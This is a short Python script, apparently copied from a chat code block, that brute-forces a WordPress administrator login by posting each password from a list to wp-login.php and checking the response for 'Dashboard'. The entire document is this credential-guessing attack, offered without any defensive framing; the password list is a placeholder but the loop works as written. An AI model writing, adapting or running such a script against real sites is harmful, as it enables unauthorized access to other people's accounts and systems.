pythonimport requests

# Set the URL of the WordPress login page
url = "http://www.example.com/wp-login.php"

# Set the username and password you want to use in the login attempt
username = "admin"
password = "password"

# Set a list of possible passwords to try
password_list = ["password1", "password2", "password3", "password4"]

# Set up the session
session = requests.Session()

# Loop through each password in the list
for password in password_list:
    # Set up the login payload
    payload = {
        "log": username,
        "pwd": password
    }

    # Send a POST request to the login page with the payload
    response = session.post(url, data=payload)

    # Check the response to see if the login was successful
    if "Dashboard" in response.text:
        # If the login was successful, print a success message
        print(f"Success! The password is {password}")
        break
    else:
        # If the login was not successful, print a failure message
        print(f"Login failed for password {password}")